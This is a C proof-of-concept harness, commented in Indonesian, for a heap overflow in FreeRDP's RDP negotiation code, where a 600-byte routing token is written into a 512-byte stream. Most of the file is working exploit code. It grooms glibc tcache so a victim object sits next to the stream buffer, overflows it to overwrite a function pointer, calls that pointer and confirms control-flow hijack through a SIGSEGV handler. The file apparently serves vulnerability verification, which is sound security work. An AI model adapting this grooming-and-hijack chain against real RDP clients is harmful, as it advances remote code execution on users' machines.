/*
 * harness_chain.c — rantai: overflow `nego` (CWE-122) menjadi KENDALI ALUR EKSEKUSI.
 *
 * Kelas yang direproduksi pada revisi rentan 993499447e32… (GHSA-2vf2-grvj-6g8x):
 *   nego_set_routing_token(nego, token, 600)          → RoutingTokenLength = 600 (dikendalikan server)
 *   nego_send_negotiation_request(nego)               → Stream_New(nullptr, 512) lalu
 *                                                       Stream_Write(s, token, 600)  ← tanpa cek kapasitas
 *
 * Yang dibuktikan di sini (bukan sekadar "crash"):
 *   1. GROOMING — chunk stream 512 B ditempatkan tepat SEBELUM objek korban:
 *        A = malloc(512); B = malloc(512); free(A)  → tcache LIFO → Stream_New(512) mengambil slot A
 *      sehingga layout heap: [payload A = buffer stream][header B][payload B = korban]
 *   2. OVERFLOW — 600 byte token menulis 88 byte melewati payload A: menimpa header chunk B dan
 *      field-field awal korban (canary + pointer fungsi) dengan pola token.
 *   3. HIJACK — memanggil pointer fungsi korban melompat ke alamat pola kita → SIGSEGV di alamat
 *      yang KITA pilih. Handler SIGSEGV memverifikasi `si_addr` == pola → kendali alur terbukti.
 *
 * Catatan: harness ini HARUS dibangun TANPA AddressSanitizer — ASan memasang redzone antar chunk
 * dan akan menghentikan penulisan sebelum menimpa tetangganya (itu memang gunanya). Bukti "tetangga
 * tertimpa" justru butuh heap asli. Untuk bukti overflow-nya sendiri, lihat harness_nego.c (ASan).
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <stdint.h>
#include <unistd.h>

#include <freerdp/freerdp.h>
#include <freerdp/settings.h>
#include <winpr/wlog.h>

#include "transport.h" /* libfreerdp/core */
#include "nego.h"      /* libfreerdp/core */

#define TOKEN_LEN 600
#define STREAM_CHUNK 512
#define CHUNK_HDR 16 /* glibc: prev_size + size, sebelum payload chunk berikutnya */

typedef struct
{
	unsigned long long canary;
	void (*fn)(void);
	unsigned long long tail;
} victim_t;

static victim_t* g_victim = NULL;
static volatile int g_hijacked = 0;

static void target_fn(void)
{
	/* tidak pernah tercapai pada eksekusi normal */
	puts("  !! target_fn tercapai — seharusnya tidak terjadi");
}

static void segv_handler(int sig, siginfo_t* si, void* ctx)
{
	(void)sig;
	(void)ctx;
	const unsigned long long want = 0x4141414141414141ULL;
	const unsigned long long got = (unsigned long long)(uintptr_t)si->si_addr;
	char buf[256];
	int n = snprintf(buf, sizeof(buf),
	                 "  SINYAL %d: alamat fault = 0x%016llx (diinginkan 0x%016llx)\n", sig, got, want);
	if (n > 0)
		(void)!write(1, buf, (size_t)n);
	if (got == want)
	{
		const char* ok = "  HIJACK TERBUKTI: kendali alur eksekusi diambil alih (pc = pola token)\n"
		                 "VERDICT: TERBUKTI — overflow menjadi control-flow hijack\n";
		(void)!write(1, ok, strlen(ok));
		_exit(0);
	}
	{
		const char* no = "VERDICT: BELUM TERBUKTI — fault bukan di alamat pola\n";
		(void)!write(1, no, strlen(no));
		_exit(1);
	}
}

int main(void)
{
	/* handler SIGSEGV lebih dulu supaya crash = bukti, bukan kematian bisu */
	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = segv_handler;
	sa.sa_flags = SA_SIGINFO;
	sigaction(SIGSEGV, &sa, NULL);
	sigaction(SIGBUS, &sa, NULL);
	sigaction(SIGILL, &sa, NULL);

	WLog_SetLogLevel(WLog_GetRoot(), WLOG_ERROR);

	unsigned char* token = (unsigned char*)malloc(TOKEN_LEN);
	if (!token)
		return 3;
	memset(token, 0x41, TOKEN_LEN); /* pola yang akan menimpa tetangga */
	memcpy(token, "Cookie: mstshash=poc\r\n", 22);

	freerdp* instance = freerdp_new();
	if (!instance)
		return 3;
	instance->ContextSize = sizeof(rdpContext);
	if (!freerdp_context_new(instance))
		return 3;
	rdpContext* context = instance->context;
	if (!context)
		return 3;

	rdpTransport* transport = transport_new(context);
	if (!transport)
		return 3;
	rdpNego* nego = nego_new(transport);
	if (!nego)
		return 3;

	/* --- 1. GROOMING ---
	 * Heap sudah punya lubang dari alokasi awal FreeRDP, jadi tidak cukup berharap A/B berdampingan:
	 * cari pasangan chunk yang BENAR-BENAR bersebelahan, lalu bebaskan A-nya sebagai tindakan terakhir
	 * (tcache LIFO → malloc(512) milik Stream_New mengambil slot itu, dan B tepat di belakangnya). */
#define PAIRS 256
	static unsigned char* A_arr[PAIRS];
	static victim_t* B_arr[PAIRS];
	unsigned char* A = NULL;
	victim_t* B = NULL;
	int found = -1;
	for (int i = 0; i < PAIRS; i++)
	{
		A_arr[i] = (unsigned char*)malloc(STREAM_CHUNK);
		B_arr[i] = (victim_t*)malloc(STREAM_CHUNK);
		if (!A_arr[i] || !B_arr[i])
			return 3;
		if ((long)((unsigned char*)B_arr[i] - A_arr[i]) == STREAM_CHUNK + CHUNK_HDR)
		{
			A = A_arr[i];
			B = B_arr[i];
			found = i;
			break;
		}
	}
	if (!A || !B)
	{
		printf("  [x] tak menemukan pasangan bersebelahan dalam %d percobaan — berhenti (tak mengklaim)\n",
		       PAIRS);
		return 2;
	}
	B->canary = 0xDEADBEEFCAFEBABEULL;
	B->fn = target_fn;
	B->tail = 0xFEEDFACECAFED00DULL;
	g_victim = B;

	printf("harness rantai — overflow nego → control-flow hijack\n");
	printf("  grooming: pasangan #%d A=%p B=%p selisih=%ld (payload + header = %d)\n", found, (void*)A,
	       (void*)B, (long)((unsigned char*)B - A), STREAM_CHUNK + CHUNK_HDR);
	free(A); /* terakhir dibebaskan → di kepala tcache untuk kelas 512 */
	printf("  A dibebaskan; B (korban) tetap teralokasi tepat di belakangnya\n");
	fflush(stdout);

	/* --- 2. OVERFLOW (jalur rentan) --- */
	if (!nego_set_routing_token(nego, token, (UINT32)TOKEN_LEN))
		return 2;
	printf("  RoutingTokenLength=%d disuntik; memanggil nego_send_negotiation_request\n", TOKEN_LEN);
	fflush(stdout);
	(void)nego_send_negotiation_request(nego);

	printf("  setelah overflow: korban canary=0x%016llx fn=%p tail=0x%016llx\n", B->canary,
	       (void*)B->fn, B->tail);
	fflush(stdout);

	if (B->fn == target_fn)
	{
		printf("  [x] pointer korban TIDAK tertimpa — bukti hijack tak bisa diklaim\n");
		return 1;
	}
	printf("  korban tertimpa (fn != target_fn) → memanggil pointer itu sekarang\n");
	fflush(stdout);

	/* --- 3. HIJACK (handler SIGSEGV di atas yang menilai) --- */
	g_hijacked = 1;
	if (B->fn)
		B->fn();

	/* kalau kembali ke sini tanpa sinyal, bukti gagal */
	printf("  [x] pemanggilan kembali normal — tak ada hijack\n");
	return 1;
}
